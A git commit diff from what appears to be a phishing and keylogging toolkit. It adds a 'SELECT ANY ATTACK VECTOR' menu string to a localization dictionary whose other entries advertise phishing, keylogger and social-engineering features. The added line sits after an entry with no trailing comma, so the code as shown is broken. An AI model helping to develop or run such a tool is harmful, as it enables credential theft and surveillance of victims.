b0c72abbaa2c78b67d6686c2f08245f51bfc6202
sTiKyt <stikyt@protonmail.com>
2020-05-10 15:58:18 +0300

    Created dictionary entry "attack_vector_message"

--- Defs/LocalizationManager/lang_action_manager/lang_main_runner.py
+++ Defs/LocalizationManager/lang_action_manager/lang_main_runner.py
@@ -17,6 +17,7 @@ lang_start_main_menu = {
     "short_description": _("{1}[{0} Modern Phishing Tool With Advanced Functionality {1}]").format(default_palette[2],default_palette[0]),
     "features_summary" : _("{1}[{0} PHISHING-KEYLOGGER-INFORMATION COLLECTOR-ALL_IN_ONE_TOOL-SOCIALENGINEERING {1}]").format(default_palette[2], default_palette[0]),
     "down_line" : "{0}________________________________________________________________________________".format(default_palette[0])
+    "attack_vector_message" : _("------------------------\nSELECT ANY ATTACK VECTOR:\n------------------------"),
 }
 
              
